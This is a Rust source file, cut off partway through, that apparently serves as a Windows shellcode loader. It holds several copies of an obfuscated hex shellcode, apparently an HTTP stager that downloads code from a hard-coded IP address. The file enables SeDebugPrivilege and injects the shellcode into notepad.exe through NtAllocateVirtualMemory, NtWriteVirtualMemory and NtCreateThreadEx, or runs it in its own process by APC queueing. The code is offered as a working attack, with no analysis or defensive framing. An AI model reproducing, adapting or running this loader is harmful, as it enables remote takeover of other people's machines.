use std::{os::windows::{raw::HANDLE, prelude::{OsStringExt, OsStrExt}}, mem::{zeroed, size_of, self}, ffi::{OsStr, OsString, CString, CStr}, str::from_utf8, ptr::{null_mut, self}};
use ntapi::{ntpsapi::{ PS_ATTRIBUTE_LIST}, ntapi_base::CLIENT_ID};
use winapi::{
    ctypes::{c_void},
    shared::{
        basetsd::{SIZE_T, PSIZE_T},
        ntdef::{OBJECT_ATTRIBUTES, VOID,  PVOID, NULL,LUID, PHANDLE, LPCSTR, LPCWSTR, NTSTATUS},
        minwindef::{LPVOID, DWORD, ULONG}
    },
    um::{
        processthreadsapi::{ExitThread, GetCurrentProcess, CreateRemoteThread, OpenProcessToken, OpenProcess, OpenThread, ResumeThread, QueueUserAPC, GetCurrentThread, CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION},
        winnt::{TOKEN_QUERY,TOKEN_ADJUST_PRIVILEGES,ACCESS_MASK, PROCESS_ALL_ACCESS, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, TOKEN_PRIVILEGES, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, SE_DEBUG_NAME, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_VM_READ, THREAD_ALL_ACCESS, PAPCFUNC},
        tlhelp32::{CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, PROCESSENTRY32, Process32First, Process32Next, THREADENTRY32, Thread32First, Thread32Next, TH32CS_SNAPTHREAD},
        memoryapi::{VirtualAlloc, VirtualProtect, WriteProcessMemory, VirtualAllocEx}, 
        handleapi::CloseHandle, 
        winbase::{INFINITE, CREATE_SUSPENDED, LookupPrivilegeValueA,LookupPrivilegeValueW, LookupPrivilegeNameW, FormatMessageW},
        synchapi::WaitForSingleObject,
        securitybaseapi::AdjustTokenPrivileges, minwinbase::PTHREAD_START_ROUTINE
    }
};
mod lib;
use lib::*; 
use windows::Win32::Foundation::GetLastError;

fn StrToU8Array(str : &str) -> Vec<u8> {
    let hex_string = str.replace("%%##..", "");
    let bytes = hex::decode(hex_string).unwrap();
    let result = bytes.as_slice(); 
    result.to_vec()
}

pub fn print_memory(memory_ptr: *const u8, size: usize) {
    unsafe {
        let memory_slice = std::slice::from_raw_parts(memory_ptr, size);
        for byte in memory_slice {
            print!("{:02x} ", byte);
        }
    }
    println!("");
}
fn getPrivilege(handle : *mut c_void){
    unsafe{
        let mut h_token: HANDLE = ptr::null_mut();
        let mut h_token_ptr: *mut HANDLE = &mut h_token;
        let mut tkp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: LUID {
                    LowPart: 0,
                    HighPart: 0,
                },
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };
        // 打开当前进程的访问令牌
        let token = OpenProcessToken(handle, TOKEN_ADJUST_PRIVILEGES, h_token_ptr as *mut *mut winapi::ctypes::c_void);
        if   token != 0 {
            let systemname :LPCSTR = std::ptr::null();
            if  LookupPrivilegeValueA(
                systemname,
                b"SeDebugPrivilege\0".as_ptr() as LPCSTR,
                &mut tkp.Privileges[0].Luid) != 0 {
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                // 提升当前进程的 SeDebugPrivilege 权限
                // println!("{:?}",h_token);
                if  AdjustTokenPrivileges(
                    h_token as  *mut winapi::ctypes::c_void,
                    0, 
                    &mut tkp, 
                    0, 
                    ptr::null_mut(), 
                    ptr::null_mut())  != 0 {
                    println!("Token privileges adjusted successfully");
                } else {
                    let last_error = GetLastError() ;
                    println!("AdjustTokenPrivileges failed with error: NTSTATUS({:?})", last_error);
                }
            } else {
                let last_error = GetLastError() ;
                println!("LookupPrivilegeValue failed with error: NTSTATUS({:?})", last_error);
            }
            // 关闭访问令牌句柄
                CloseHandle(h_token_ptr as  *mut winapi::ctypes::c_void);
        } else {
            let last_error = GetLastError() ;
            println!("OpenProcessToken failed with error: NTSTATUS({:?})", last_error);
        }
    }
}

fn notepadCreateThread(){
    unsafe{
        let shellcode = StrToU8Array("%%##..fc%%##..48%%##..83%%##..e4%%##..f0%%##..e8%%##..c8%%##..00%%##..00%%##..00%%##..41%%##..51%%##..41%%##..50%%##..52%%##..51%%##..56%%##..48%%##..31%%##..d2%%##..65%%##..48%%##..8b%%##..52%%##..60%%##..48%%##..8b%%##..52%%##..18%%##..48%%##..8b%%##..52%%##..20%%##..48%%##..8b%%##..72%%##..50%%##..48%%##..0f%%##..b7%%##..4a%%##..4a%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..3c%%##..61%%##..7c%%##..02%%##..2c%%##..20%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..e2%%##..ed%%##..52%%##..41%%##..51%%##..48%%##..8b%%##..52%%##..20%%##..8b%%##..42%%##..3c%%##..48%%##..01%%##..d0%%##..66%%##..81%%##..78%%##..18%%##..0b%%##..02%%##..75%%##..72%%##..8b%%##..80%%##..88%%##..00%%##..00%%##..00%%##..48%%##..85%%##..c0%%##..74%%##..67%%##..48%%##..01%%##..d0%%##..50%%##..8b%%##..48%%##..18%%##..44%%##..8b%%##..40%%##..20%%##..49%%##..01%%##..d0%%##..e3%%##..56%%##..48%%##..ff%%##..c9%%##..41%%##..8b%%##..34%%##..88%%##..48%%##..01%%##..d6%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..38%%##..e0%%##..75%%##..f1%%##..4c%%##..03%%##..4c%%##..24%%##..08%%##..45%%##..39%%##..d1%%##..75%%##..d8%%##..58%%##..44%%##..8b%%##..40%%##..24%%##..49%%##..01%%##..d0%%##..66%%##..41%%##..8b%%##..0c%%##..48%%##..44%%##..8b%%##..40%%##..1c%%##..49%%##..01%%##..d0%%##..41%%##..8b%%##..04%%##..88%%##..48%%##..01%%##..d0%%##..41%%##..58%%##..41%%##..58%%##..5e%%##..59%%##..5a%%##..41%%##..58%%##..41%%##..59%%##..41%%##..5a%%##..48%%##..83%%##..ec%%##..20%%##..41%%##..52%%##..ff%%##..e0%%##..58%%##..41%%##..59%%##..5a%%##..48%%##..8b%%##..12%%##..e9%%##..4f%%##..ff%%##..ff%%##..ff%%##..5d%%##..6a%%##..00%%##..49%%##..be%%##..77%%##..69%%##..6e%%##..69%%##..6e%%##..65%%##..74%%##..00%%##..41%%##..56%%##..49%%##..89%%##..e6%%##..4c%%##..89%%##..f1%%##..41%%##..ba%%##..4c%%##..77%%##..26%%##..07%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..48%%##..31%%##..d2%%##..4d%%##..31%%##..c0%%##..4d%%##..31%%##..c9%%##..41%%##..50%%##..41%%##..50%%##..41%%##..ba%%##..3a%%##..56%%##..79%%##..a7%%##..ff%%##..d5%%##..eb%%##..73%%##..5a%%##..48%%##..89%%##..c1%%##..41%%##..b8%%##..5c%%##..11%%##..00%%##..00%%##..4d%%##..31%%##..c9%%##..41%%##..51%%##..41%%##..51%%##..6a%%##..03%%##..41%%##..51%%##..41%%##..ba%%##..57%%##..89%%##..9f%%##..c6%%##..ff%%##..d5%%##..eb%%##..59%%##..5b%%##..48%%##..89%%##..c1%%##..48%%##..31%%##..d2%%##..49%%##..89%%##..d8%%##..4d%%##..31%%##..c9%%##..52%%##..68%%##..00%%##..02%%##..40%%##..84%%##..52%%##..52%%##..41%%##..ba%%##..eb%%##..55%%##..2e%%##..3b%%##..ff%%##..d5%%##..48%%##..89%%##..c6%%##..48%%##..83%%##..c3%%##..50%%##..6a%%##..0a%%##..5f%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..49%%##..c7%%##..c0%%##..ff%%##..ff%%##..ff%%##..ff%%##..4d%%##..31%%##..c9%%##..52%%##..52%%##..41%%##..ba%%##..2d%%##..06%%##..18%%##..7b%%##..ff%%##..d5%%##..85%%##..c0%%##..0f%%##..85%%##..9d%%##..01%%##..00%%##..00%%##..48%%##..ff%%##..cf%%##..0f%%##..84%%##..8c%%##..01%%##..00%%##..00%%##..eb%%##..d3%%##..e9%%##..e4%%##..01%%##..00%%##..00%%##..e8%%##..a2%%##..ff%%##..ff%%##..ff%%##..2f%%##..62%%##..51%%##..38%%##..72%%##..00%%##..82%%##..00%%##..89%%##..39%%##..7b%%##..eb%%##..1a%%##..94%%##..fc%%##..a3%%##..70%%##..ed%%##..7d%%##..a7%%##..43%%##..60%%##..06%%##..bf%%##..7f%%##..b2%%##..f7%%##..8d%%##..55%%##..66%%##..fe%%##..76%%##..53%%##..3e%%##..d5%%##..75%%##..a4%%##..42%%##..b7%%##..c6%%##..c7%%##..12%%##..32%%##..01%%##..87%%##..a8%%##..21%%##..4f%%##..bc%%##..f6%%##..e4%%##..e4%%##..82%%##..86%%##..7c%%##..9a%%##..7d%%##..fb%%##..ea%%##..40%%##..07%%##..a3%%##..7b%%##..93%%##..a3%%##..bb%%##..dd%%##..ba%%##..1c%%##..bf%%##..25%%##..69%%##..37%%##..03%%##..1d%%##..d3%%##..a4%%##..36%%##..24%%##..00%%##..55%%##..73%%##..65%%##..72%%##..2d%%##..41%%##..67%%##..65%%##..6e%%##..74%%##..3a%%##..20%%##..4d%%##..6f%%##..7a%%##..69%%##..6c%%##..6c%%##..61%%##..2f%%##..35%%##..2e%%##..30%%##..20%%##..28%%##..63%%##..6f%%##..6d%%##..70%%##..61%%##..74%%##..69%%##..62%%##..6c%%##..65%%##..3b%%##..20%%##..4d%%##..53%%##..49%%##..45%%##..20%%##..39%%##..2e%%##..30%%##..3b%%##..20%%##..57%%##..69%%##..6e%%##..64%%##..6f%%##..77%%##..73%%##..20%%##..4e%%##..54%%##..20%%##..36%%##..2e%%##..31%%##..3b%%##..20%%##..57%%##..4f%%##..57%%##..36%%##..34%%##..3b%%##..20%%##..54%%##..72%%##..69%%##..64%%##..65%%##..6e%%##..74%%##..2f%%##..35%%##..2e%%##..30%%##..3b%%##..20%%##..42%%##..4f%%##..49%%##..45%%##..39%%##..3b%%##..45%%##..4e%%##..55%%##..53%%##..4d%%##..53%%##..45%%##..29%%##..0d%%##..0a%%##..00%%##..5f%%##..e6%%##..73%%##..8d%%##..a5%%##..c0%%##..c9%%##..ab%%##..0c%%##..eb%%##..35%%##..7a%%##..a2%%##..e3%%##..bf%%##..5b%%##..89%%##..c3%%##..ed%%##..bc%%##..25%%##..5e%%##..de%%##..3f%%##..da%%##..d2%%##..4c%%##..4e%%##..ba%%##..84%%##..e9%%##..fd%%##..fc%%##..ab%%##..10%%##..7b%%##..04%%##..8d%%##..3f%%##..ba%%##..56%%##..28%%##..a6%%##..91%%##..c5%%##..f7%%##..49%%##..e5%%##..91%%##..89%%##..09%%##..0e%%##..03%%##..22%%##..35%%##..f0%%##..90%%##..f8%%##..05%%##..81%%##..13%%##..67%%##..3a%%##..93%%##..eb%%##..59%%##..27%%##..f0%%##..be%%##..32%%##..d9%%##..ae%%##..18%%##..dc%%##..9d%%##..9b%%##..c9%%##..d0%%##..cb%%##..22%%##..00%%##..53%%##..36%%##..2f%%##..0b%%##..d2%%##..ac%%##..d2%%##..9d%%##..9d%%##..94%%##..4c%%##..83%%##..10%%##..37%%##..a9%%##..69%%##..8b%%##..38%%##..fc%%##..38%%##..3a%%##..45%%##..d0%%##..07%%##..db%%##..ae%%##..3c%%##..e0%%##..b6%%##..7c%%##..ad%%##..a3%%##..c7%%##..36%%##..2c%%##..48%%##..26%%##..35%%##..4a%%##..fc%%##..e1%%##..68%%##..16%%##..3d%%##..33%%##..1c%%##..98%%##..12%%##..2c%%##..de%%##..22%%##..9b%%##..e0%%##..02%%##..13%%##..8c%%##..90%%##..d3%%##..ba%%##..11%%##..20%%##..85%%##..66%%##..a4%%##..e0%%##..57%%##..94%%##..e8%%##..09%%##..fb%%##..9d%%##..1c%%##..49%%##..a2%%##..06%%##..e1%%##..05%%##..83%%##..c8%%##..5d%%##..68%%##..cc%%##..fd%%##..35%%##..31%%##..b0%%##..45%%##..99%%##..f3%%##..05%%##..51%%##..96%%##..15%%##..77%%##..1e%%##..25%%##..9e%%##..5f%%##..4f%%##..e8%%##..41%%##..ee%%##..d2%%##..dd%%##..55%%##..74%%##..27%%##..c3%%##..87%%##..e1%%##..bf%%##..08%%##..60%%##..b4%%##..93%%##..81%%##..f4%%##..62%%##..64%%##..6c%%##..8c%%##..63%%##..00%%##..41%%##..be%%##..f0%%##..b5%%##..a2%%##..56%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..ba%%##..00%%##..00%%##..40%%##..00%%##..41%%##..b8%%##..00%%##..10%%##..00%%##..00%%##..41%%##..b9%%##..40%%##..00%%##..00%%##..00%%##..41%%##..ba%%##..58%%##..a4%%##..53%%##..e5%%##..ff%%##..d5%%##..48%%##..93%%##..53%%##..53%%##..48%%##..89%%##..e7%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..41%%##..b8%%##..00%%##..20%%##..00%%##..00%%##..49%%##..89%%##..f9%%##..41%%##..ba%%##..12%%##..96%%##..89%%##..e2%%##..ff%%##..d5%%##..48%%##..83%%##..c4%%##..20%%##..85%%##..c0%%##..74%%##..b6%%##..66%%##..8b%%##..07%%##..48%%##..01%%##..c3%%##..85%%##..c0%%##..75%%##..d7%%##..58%%##..58%%##..58%%##..48%%##..05%%##..00%%##..00%%##..00%%##..00%%##..50%%##..c3%%##..e8%%##..9f%%##..fd%%##..ff%%##..ff%%##..33%%##..39%%##..2e%%##..31%%##..30%%##..37%%##..2e%%##..32%%##..33%%##..39%%##..2e%%##..33%%##..30%%##..00%%##..12%%##..34%%##..56%%##..78");
        let mut handle =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
        if !handle.is_null() {
            let mut process_entry : PROCESSENTRY32 = zeroed();
            process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
            if Process32First(handle, &mut process_entry) == 1{
                loop {
                        let extFileName = OsString::from_wide(process_entry.szExeFile.iter().map(|&x| x as u16).collect::<Vec<u16>>().as_slice());
                        if extFileName.to_string_lossy().into_owned().starts_with("notepad.exe") || extFileName.to_string_lossy().into_owned().starts_with("Notepad.exe"){
                            let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_entry.th32ProcessID);
                            println!("{:?}",process_handle);
                            getPrivilege(process_handle);
                            if !process_handle.is_null() {
                                let mut base_address = std::ptr::null_mut();
                                let buffer = 
                                    // 分配虚拟内存
                                    NtAllocateVirtualMemory(
                                        process_handle as *mut std::ffi::c_void,
                                        &mut base_address as *mut *mut winapi::ctypes::c_void,
                                        0,
                                        &mut shellcode.len() as _,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE,
                                    );
                                if  buffer == 0  {
                                        let mut bytes_written : PSIZE_T = null_mut();
                                        let status = NtWriteVirtualMemory(
                                            process_handle as *mut std::ffi::c_void,
                                            base_address as PVOID,
                                            shellcode.as_ptr() as PVOID,
                                            shellcode.len(), 
                                            bytes_written
                                        );
                                        if status == 0{
                                            let mut thread_handle: HANDLE = std::ptr::null_mut();
                                            let remote_thread = NtCreateThreadEx(
                                                &mut thread_handle, 
                                                PROCESS_ALL_ACCESS,
                                                std::ptr::null_mut(), 
                                                process_handle as *mut std::ffi::c_void,
                                                base_address as *mut winapi::ctypes::c_void, 
                                                std::ptr::null_mut(),
                                                CREATE_SUSPENDED,
                                                0,
                                                0,
                                                0,
                                                std::ptr::null_mut(),
                                                );
                                            if remote_thread != 0 {
                                                WaitForSingleObject(remote_thread as *mut winapi::ctypes::c_void, INFINITE);
                                                CloseHandle(remote_thread as *mut winapi::ctypes::c_void);
                                            }
                                    }
                                    CloseHandle(buffer as *mut winapi::ctypes::c_void);
                            }
                            CloseHandle(process_handle as *mut winapi::ctypes::c_void);
                        }

                }
                process_entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
                if Process32Next(handle, &mut process_entry) == 0 {
                    break;
                }
            }
        }
    }
    }
}

fn ApcThreadCreateNtalert(){
    unsafe{
        let shellcode = StrToU8Array("%%##..fc%%##..48%%##..83%%##..e4%%##..f0%%##..e8%%##..c8%%##..00%%##..00%%##..00%%##..41%%##..51%%##..41%%##..50%%##..52%%##..51%%##..56%%##..48%%##..31%%##..d2%%##..65%%##..48%%##..8b%%##..52%%##..60%%##..48%%##..8b%%##..52%%##..18%%##..48%%##..8b%%##..52%%##..20%%##..48%%##..8b%%##..72%%##..50%%##..48%%##..0f%%##..b7%%##..4a%%##..4a%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..3c%%##..61%%##..7c%%##..02%%##..2c%%##..20%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..e2%%##..ed%%##..52%%##..41%%##..51%%##..48%%##..8b%%##..52%%##..20%%##..8b%%##..42%%##..3c%%##..48%%##..01%%##..d0%%##..66%%##..81%%##..78%%##..18%%##..0b%%##..02%%##..75%%##..72%%##..8b%%##..80%%##..88%%##..00%%##..00%%##..00%%##..48%%##..85%%##..c0%%##..74%%##..67%%##..48%%##..01%%##..d0%%##..50%%##..8b%%##..48%%##..18%%##..44%%##..8b%%##..40%%##..20%%##..49%%##..01%%##..d0%%##..e3%%##..56%%##..48%%##..ff%%##..c9%%##..41%%##..8b%%##..34%%##..88%%##..48%%##..01%%##..d6%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..38%%##..e0%%##..75%%##..f1%%##..4c%%##..03%%##..4c%%##..24%%##..08%%##..45%%##..39%%##..d1%%##..75%%##..d8%%##..58%%##..44%%##..8b%%##..40%%##..24%%##..49%%##..01%%##..d0%%##..66%%##..41%%##..8b%%##..0c%%##..48%%##..44%%##..8b%%##..40%%##..1c%%##..49%%##..01%%##..d0%%##..41%%##..8b%%##..04%%##..88%%##..48%%##..01%%##..d0%%##..41%%##..58%%##..41%%##..58%%##..5e%%##..59%%##..5a%%##..41%%##..58%%##..41%%##..59%%##..41%%##..5a%%##..48%%##..83%%##..ec%%##..20%%##..41%%##..52%%##..ff%%##..e0%%##..58%%##..41%%##..59%%##..5a%%##..48%%##..8b%%##..12%%##..e9%%##..4f%%##..ff%%##..ff%%##..ff%%##..5d%%##..6a%%##..00%%##..49%%##..be%%##..77%%##..69%%##..6e%%##..69%%##..6e%%##..65%%##..74%%##..00%%##..41%%##..56%%##..49%%##..89%%##..e6%%##..4c%%##..89%%##..f1%%##..41%%##..ba%%##..4c%%##..77%%##..26%%##..07%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..48%%##..31%%##..d2%%##..4d%%##..31%%##..c0%%##..4d%%##..31%%##..c9%%##..41%%##..50%%##..41%%##..50%%##..41%%##..ba%%##..3a%%##..56%%##..79%%##..a7%%##..ff%%##..d5%%##..eb%%##..73%%##..5a%%##..48%%##..89%%##..c1%%##..41%%##..b8%%##..5c%%##..11%%##..00%%##..00%%##..4d%%##..31%%##..c9%%##..41%%##..51%%##..41%%##..51%%##..6a%%##..03%%##..41%%##..51%%##..41%%##..ba%%##..57%%##..89%%##..9f%%##..c6%%##..ff%%##..d5%%##..eb%%##..59%%##..5b%%##..48%%##..89%%##..c1%%##..48%%##..31%%##..d2%%##..49%%##..89%%##..d8%%##..4d%%##..31%%##..c9%%##..52%%##..68%%##..00%%##..02%%##..40%%##..84%%##..52%%##..52%%##..41%%##..ba%%##..eb%%##..55%%##..2e%%##..3b%%##..ff%%##..d5%%##..48%%##..89%%##..c6%%##..48%%##..83%%##..c3%%##..50%%##..6a%%##..0a%%##..5f%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..49%%##..c7%%##..c0%%##..ff%%##..ff%%##..ff%%##..ff%%##..4d%%##..31%%##..c9%%##..52%%##..52%%##..41%%##..ba%%##..2d%%##..06%%##..18%%##..7b%%##..ff%%##..d5%%##..85%%##..c0%%##..0f%%##..85%%##..9d%%##..01%%##..00%%##..00%%##..48%%##..ff%%##..cf%%##..0f%%##..84%%##..8c%%##..01%%##..00%%##..00%%##..eb%%##..d3%%##..e9%%##..e4%%##..01%%##..00%%##..00%%##..e8%%##..a2%%##..ff%%##..ff%%##..ff%%##..2f%%##..58%%##..59%%##..32%%##..7a%%##..00%%##..9a%%##..dd%%##..af%%##..72%%##..70%%##..67%%##..7e%%##..07%%##..d1%%##..09%%##..da%%##..39%%##..83%%##..86%%##..6d%%##..74%%##..d0%%##..93%%##..f6%%##..0f%%##..63%%##..7c%%##..ba%%##..e9%%##..9d%%##..e3%%##..2d%%##..72%%##..99%%##..ae%%##..e2%%##..df%%##..04%%##..2d%%##..46%%##..da%%##..12%%##..ee%%##..0f%%##..50%%##..86%%##..c1%%##..06%%##..6a%%##..5a%%##..fd%%##..f0%%##..54%%##..41%%##..8d%%##..3e%%##..80%%##..58%%##..90%%##..6a%%##..6a%%##..7d%%##..87%%##..12%%##..ed%%##..63%%##..fa%%##..78%%##..52%%##..3b%%##..0c%%##..0f%%##..bf%%##..6a%%##..73%%##..0b%%##..9f%%##..91%%##..00%%##..55%%##..73%%##..65%%##..72%%##..2d%%##..41%%##..67%%##..65%%##..6e%%##..74%%##..3a%%##..20%%##..4d%%##..6f%%##..7a%%##..69%%##..6c%%##..6c%%##..61%%##..2f%%##..34%%##..2e%%##..30%%##..20%%##..28%%##..63%%##..6f%%##..6d%%##..70%%##..61%%##..74%%##..69%%##..62%%##..6c%%##..65%%##..3b%%##..20%%##..4d%%##..53%%##..49%%##..45%%##..20%%##..38%%##..2e%%##..30%%##..3b%%##..20%%##..57%%##..69%%##..6e%%##..64%%##..6f%%##..77%%##..73%%##..20%%##..4e%%##..54%%##..20%%##..36%%##..2e%%##..31%%##..3b%%##..20%%##..54%%##..72%%##..69%%##..64%%##..65%%##..6e%%##..74%%##..2f%%##..34%%##..2e%%##..30%%##..29%%##..0d%%##..0a%%##..00%%##..a2%%##..dc%%##..21%%##..6c%%##..a7%%##..cc%%##..0a%%##..41%%##..49%%##..31%%##..a9%%##..ae%%##..0a%%##..53%%##..a0%%##..cf%%##..08%%##..93%%##..c5%%##..ae%%##..1d%%##..b4%%##..2b%%##..12%%##..97%%##..e2%%##..92%%##..f2%%##..d4%%##..d6%%##..b8%%##..c5%%##..46%%##..d5%%##..e6%%##..48%%##..39%%##..60%%##..a9%%##..6f%%##..85%%##..a2%%##..f8%%##..5e%%##..c6%%##..ea%%##..c1%%##..ed%%##..38%%##..ac%%##..19%%##..d9%%##..ef%%##..4b%%##..4b%%##..88%%##..4d%%##..56%%##..ef%%##..2e%%##..75%%##..1e%%##..30%%##..a0%%##..46%%##..7d%%##..a5%%##..47%%##..a2%%##..a8%%##..61%%##..e4%%##..4e%%##..43%%##..66%%##..88%%##..c8%%##..7b%%##..bf%%##..d6%%##..0d%%##..03%%##..b3%%##..93%%##..bf%%##..a3%%##..20%%##..54%%##..21%%##..cf%%##..0c%%##..72%%##..37%%##..71%%##..06%%##..89%%##..78%%##..2c%%##..e3%%##..31%%##..c4%%##..2e%%##..69%%##..87%%##..3a%%##..d7%%##..2f%%##..75%%##..f2%%##..2c%%##..b3%%##..c1%%##..40%%##..66%%##..7b%%##..94%%##..94%%##..e1%%##..7c%%##..b3%%##..fc%%##..78%%##..3c%%##..6f%%##..05%%##..bd%%##..e5%%##..72%%##..3a%%##..05%%##..4b%%##..d7%%##..9e%%##..06%%##..68%%##..c5%%##..d4%%##..d3%%##..2c%%##..4b%%##..71%%##..f8%%##..8f%%##..81%%##..ae%%##..30%%##..b9%%##..6f%%##..13%%##..83%%##..79%%##..3d%%##..8c%%##..00%%##..b8%%##..59%%##..1f%%##..14%%##..b2%%##..f1%%##..dc%%##..bd%%##..42%%##..0a%%##..50%%##..24%%##..d2%%##..82%%##..a9%%##..54%%##..5f%%##..c0%%##..58%%##..3e%%##..ae%%##..b6%%##..aa%%##..97%%##..a9%%##..54%%##..90%%##..12%%##..0b%%##..05%%##..40%%##..10%%##..5f%%##..10%%##..d5%%##..f6%%##..8d%%##..e7%%##..e2%%##..d9%%##..f7%%##..77%%##..46%%##..c1%%##..d1%%##..c0%%##..51%%##..4d%%##..6e%%##..8b%%##..82%%##..9b%%##..e6%%##..2f%%##..be%%##..8e%%##..1b%%##..5c%%##..e3%%##..7f%%##..b6%%##..ac%%##..e1%%##..7f%%##..0b%%##..1e%%##..94%%##..27%%##..01%%##..58%%##..5f%%##..00%%##..41%%##..be%%##..f0%%##..b5%%##..a2%%##..56%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..ba%%##..00%%##..00%%##..40%%##..00%%##..41%%##..b8%%##..00%%##..10%%##..00%%##..00%%##..41%%##..b9%%##..40%%##..00%%##..00%%##..00%%##..41%%##..ba%%##..58%%##..a4%%##..53%%##..e5%%##..ff%%##..d5%%##..48%%##..93%%##..53%%##..53%%##..48%%##..89%%##..e7%%##..48%%##..89%%##..f1%%##..48%%##..89%%##..da%%##..41%%##..b8%%##..00%%##..20%%##..00%%##..00%%##..49%%##..89%%##..f9%%##..41%%##..ba%%##..12%%##..96%%##..89%%##..e2%%##..ff%%##..d5%%##..48%%##..83%%##..c4%%##..20%%##..85%%##..c0%%##..74%%##..b6%%##..66%%##..8b%%##..07%%##..48%%##..01%%##..c3%%##..85%%##..c0%%##..75%%##..d7%%##..58%%##..58%%##..58%%##..48%%##..05%%##..00%%##..00%%##..00%%##..00%%##..50%%##..c3%%##..e8%%##..9f%%##..fd%%##..ff%%##..ff%%##..33%%##..39%%##..2e%%##..31%%##..30%%##..37%%##..2e%%##..32%%##..33%%##..39%%##..2e%%##..33%%##..30%%##..00%%##..12%%##..34%%##..56%%##..78");
        getPrivilege(GetCurrentProcess());
        let mut base_address = std::ptr::null_mut();
        let buffer =
            // 分配虚拟内存
            NtAllocateVirtualMemory(
                GetCurrentProcess() as *mut std::ffi::c_void,
                &mut base_address as *mut *mut winapi::ctypes::c_void,
                0,
                &mut shellcode.len() as _,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
        if  buffer == 0  {
            let mut bytes_written : PSIZE_T = null_mut();
            let status = NtWriteVirtualMemory(
                GetCurrentProcess() as *mut std::ffi::c_void,
                base_address as PVOID,
                shellcode.as_ptr() as PVOID,
                shellcode.len(), 
                bytes_written
            );
            if status != 0{
                println!("NtWriteVirtualMemory error with NTSTATUS({:?})",buffer);
            }
        }else{
            println!("NtAllocateVirtualMemory error with NTSTATUS({:?})",buffer);
        }
            let apc_func = std::mem::transmute::<*mut winapi::ctypes::c_void, Option<unsafe extern "system" fn(usize)>>(base_address);
            let result = QueueUserAPC(
                apc_func, 
                GetCurrentThread(), 
                0);
            NtTestAlert();
    }
}

fn ApcThreadCreate(){
    unsafe{
        let shellcode = StrToU8Array("%%##..fc%%##..48%%##..83%%##..e4%%##..f0%%##..e8%%##..c8%%##..00%%##..00%%##..00%%##..41%%##..51%%##..41%%##..50%%##..52%%##..51%%##..56%%##..48%%##..31%%##..d2%%##..65%%##..48%%##..8b%%##..52%%##..60%%##..48%%##..8b%%##..52%%##..18%%##..48%%##..8b%%##..52%%##..20%%##..48%%##..8b%%##..72%%##..50%%##..48%%##..0f%%##..b7%%##..4a%%##..4a%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..3c%%##..61%%##..7c%%##..02%%##..2c%%##..20%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..e2%%##..ed%%##..52%%##..41%%##..51%%##..48%%##..8b%%##..52%%##..20%%##..8b%%##..42%%##..3c%%##..48%%##..01%%##..d0%%##..66%%##..81%%##..78%%##..18%%##..0b%%##..02%%##..75%%##..72%%##..8b%%##..80%%##..88%%##..00%%##..00%%##..00%%##..48%%##..85%%##..c0%%##..74%%##..67%%##..48%%##..01%%##..d0%%##..50%%##..8b%%##..48%%##..18%%##..44%%##..8b%%##..40%%##..20%%##..49%%##..01%%##..d0%%##..e3%%##..56%%##..48%%##..ff%%##..c9%%##..41%%##..8b%%##..34%%##..88%%##..48%%##..01%%##..d6%%##..4d%%##..31%%##..c9%%##..48%%##..31%%##..c0%%##..ac%%##..41%%##..c1%%##..c9%%##..0d%%##..41%%##..01%%##..c1%%##..38%%##..e0%%##..75%%##..f1%%##..4c%%##..03%%##..4c%%##..24%%##..08%%##..45%%##..39%%##..d1%%##..75%%##..d8%%##..58%%##..44%%##..8b%%##..40%%##..24%%##..49%%##..01%%##..d0%%##..66%%##..41%%##..8b%%##..0c%%##..48%%##..44%%##..8b%%##..40%%##..1c%%##..49%%##..01%%##..d0%%##..41%%##..8b%%##..04%%##..88%%##..48%%##..01%%##..d0%%##..41%%##..58%%##..41%%##..58%%##..5e%%##..59%%##..5a%%##..41%%##..58%%##..41%%##..59%%##..41%%##..5a%%##..48%%##..83%%##..ec%%##..20%%##..41%%##..52%%##..ff%%##..e0%%##..58%%##..41%%##..59%%##..5a%%##..48%%##..8b%%##..12%%##..e9%%##..4f%%##..ff%%##..ff%%##..ff%%##..5d%%##..6a%%##..00%%##..49%%##..be%%##..77%%##..69%%##..6e%%##..69%%##..6e%%##..65%%##..74%%##..00%%##..41%%##..56%%##..49%%##..89%%##..e6%%##..4c%%##..89%%##..f1%%##..41%%##..ba%%##..4c%%##..77%%##..26%%##..07%%##..ff%%##..d5%%##..48%%##..31%%##..c9%%##..48%%##..31%%##..d2%%##..4d%%##..31%%##..c0%%##..4d%%##..31%%##..c9%%##..41%%##..50%%##..41%%##..50%%##..41%%##..ba%%##..3a%%##..56%%##..79%%##..a7%%##..ff%%##..d5%%##..eb%